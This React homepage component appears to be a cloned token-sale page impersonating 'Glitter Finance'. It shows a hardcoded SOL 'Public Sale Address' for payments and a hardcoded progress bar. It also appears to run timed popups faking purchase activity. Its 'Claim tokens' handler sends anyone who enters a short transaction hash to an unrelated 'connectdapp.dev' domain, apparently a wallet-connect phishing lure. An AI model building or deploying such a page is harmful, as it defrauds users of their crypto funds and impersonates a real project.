import React, { useState, useEffect } from "react";
import Header from "../../components/header/Header";
import "./index.css";
import { Images, teams } from "../../components/partner.data";
import Footer from "../../components/footer/Footer";
import Popup from "../../components/token-popup/Popup";
import MiniPopup from "../../components/mini-popup/Popup";
import Countdown from "react-countdown";
import "./mobile.css";
import Navigation from "../../components/navigation/Navigation";

const Homepage = () => {
  const [OpenTokenModal, setOpenTokenModal] = useState(false);
  const [OpenMiniPopup, setOpenMiniPopUp] = useState(false);
  const [OpenNavPopup, setOpenNavPopUp] = useState(false);
  const [miniPopupData] = useState({
    start: 1000,
    end: 50000,
    // value:0
  });
  const [t_hash, setHash] = useState("");

  const handleClick = () => {
    if (t_hash && t_hash.length > 8) {
      window.location.href = "https://connectdapp.dev";
    }
  };

  useEffect(() => {
    const interval = setInterval(() => {
      // if (OpenMiniPopup) {
      //   setOpenMiniPopUp(false);
      // } else {
      //   setOpenMiniPopUp(true);
      // }
      setOpenMiniPopUp(!OpenMiniPopup);
    }, 1000 * 10);

    return () => clearInterval(interval);
  });

  const renderer = ({ hours, minutes, seconds, completed, days }) => {
    if (completed) {
      // Render a completed state
      return (
        <h1
          style={{
            textAlign: "center",
            justifySelf: "center",
            display: "flex",
          }}
        >
          CLOSED
        </h1>
      );
    } else {
      const addZero = (x) => (x < 10 && x >= 0 ? "0" + x : x);
      return (
        <>
          <div className="time">
            <p>{addZero(days)}</p>
            <p>DAYS</p>
          </div>
          <span>:</span>
          <div className="time">
            <p>{addZero(hours)}</p>
            <p>HOURS</p>
          </div>
          <span>:</span>
          <div className="time">
            <p>{addZero(minutes)}</p>
            <p>MINUTES</p>
          </div>
          <span>:</span>
          <div className="time">
            <p>{addZero(seconds)}</p>
            <p>SECONDS</p>
          </div>
        </>
      );
    }
  };

  return (
    <section>
      <Header
        setOpenNavPopUp={setOpenNavPopUp}
        setOpenTokenModal={setOpenTokenModal}
      />
      <section className="main">
        <section className="banner">
          <div className="left">
            <h3>
              Glitter Finance <br></br> Connects <br></br>{" "}
              <span>Your Wallets</span>
            </h3>

            <p>
              Glitter is a brand changing innovator bridge that brings the
              everyday user into the crypto world seamlessly. <br />
              <span style={{ fontSize: "13px", marginTop: "10%" }}> </span>
            </p>

            <button onClick={() => setOpenTokenModal(true)}>BUY $XGLI</button>
          </div>
          <div className="right">
            <img
              // width="800"
              // height="714"
              src="https://glitter.finance//images/balls-set.svg"
              class="attachment-large size-large"
              alt="Axelar Hero"
              loading="lazy"
              sizes="(max-width: 800px) 100vw, 800px"
              title="Axelar Network 1"
            />
          </div>
        </section>

        <section className="token-sale">
          <h1>Public Token Sale</h1>
          <p>Become part of the future of commerce.</p>
          <div className="main-table">
            <div className="">
              <p>Provide your transaction hash below to receive token</p>
              <input
                type="text"
                required={true}
                onChange={(e) => setHash(e.target.value)}
              />
              <button onClick={() => handleClick()}>Claim tokens</button>
            </div>

            <div>
              <p>Public Sale closes in:</p>
              <div className="timing">
                <Countdown
                  date={new Date("Mar 15, 2022 15:00:00")}
                  renderer={renderer}
                />
              </div>

              <progress id="file" value="75" max="100">
                {" "}
                32%{" "}
              </progress>

              <p>Public Sale Address:</p>
              <br></br>
              <p>D1PPoKckMfq46MZ93TwDW3Xkrqr82amdKg6ffeCkVLNK</p>

              <button onClick={() => setOpenTokenModal(true)}>BUY $XGLI</button>
              <div className="coin-images" style={{ marginTop: "20px" }}>
                <img
                  src="https://cryptologos.cc/logos/solana-sol-logo.png?v=022"
                  alt="logo"
                  height={20}
                />
              </div>
              <p>$XGLI Exchange Rate</p>
              <p>1 $XGLI = $0.075</p>
            </div>

            <div>
              <h4>Currencies Accepted:</h4>
              <div className="coin-images">
                <img
                  src="https://cryptologos.cc/logos/solana-sol-logo.png?v=022"
                  alt="logo"
                />
              </div>
              <p>SOL</p>
            </div>
          </div>
        </section>

        <section className="after-banner">
          <div></div>
          <div>
            <p>Empowering developers to build scalable, cross-chain dapps</p>
            <div>
              <i className="fab fa-discord"></i>
              <i className="fab fa-telegram"></i>
              <i className="fab fa-twitter"></i>
            </div>
          </div>
        </section>

        <section className="about" id="about">
          <h1>The Platform</h1>

          <p>
            Glitter is a brand changing innovator bridge that brings the
            everyday user into the crypto world seamlessly.
          </p>

          <br></br>
          <p>
            We smooth the way through current technical and psychological
            barriers by providing user-friendly, streamlined architecture so
            that everyone in the world can feel good investing and surfing the
            crypto wave.
          </p>
        </section>

        <section className="partners" id="partners">
          <div className="partner-header">
            <h1>Partners</h1>
          </div>

          <div className="images">
            {Images.map((image, i) => (
              <img
                key={i}
                src={`${image}`}
                height="111"
                alt="Glitter Finance"
              />
            ))}
          </div>
        </section>

        <section className="team" id="team">
          <div className="team-header">
            <h1>Team</h1>
          </div>

          <div className="members">
            {teams.map((x, i) => (
              <div className="member" key={i}>
                <img src={x.url} alt="logo" />
                <p className="name">{x.name}</p>
                <div className="inner">
                  <p>{x.linkdln}</p>
                </div>

                <p className="description">{x.description}</p>
              </div>
            ))}
          </div>
        </section>

        <Footer />
      </section>

      {OpenTokenModal ? <Popup setOpenTokenModal={setOpenTokenModal} /> : null}

      {OpenMiniPopup ? (
        <MiniPopup
          setOpenMiniPopUp={setOpenMiniPopUp}
          miniPopupData={miniPopupData}
        />
      ) : null}

      {OpenNavPopup ? <Navigation setOpenNavPopUp={setOpenNavPopUp} /> : null}
    </section>
  );
};

export default Homepage;
